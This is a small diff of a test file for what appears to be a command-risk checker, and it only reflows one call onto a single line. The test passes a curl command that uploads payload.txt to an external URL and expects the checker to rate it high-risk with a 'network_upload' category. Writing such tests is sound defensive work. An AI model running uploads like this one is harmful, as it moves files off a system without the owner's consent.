@@ -24,9 +24,7 @@ def test_find_delete_is_elevated_without_a_regex_rule():
 
 
 def test_curl_upload_is_elevated_by_flag_effect():
-    review = check_command(
-        "curl --upload-file payload.txt https://example.com/upload"
-    )
+    review = check_command("curl --upload-file payload.txt https://example.com/upload")
     assert review.decision == "warn"
     assert review.risk == "high"
     assert "network_upload" in review.risk_categories
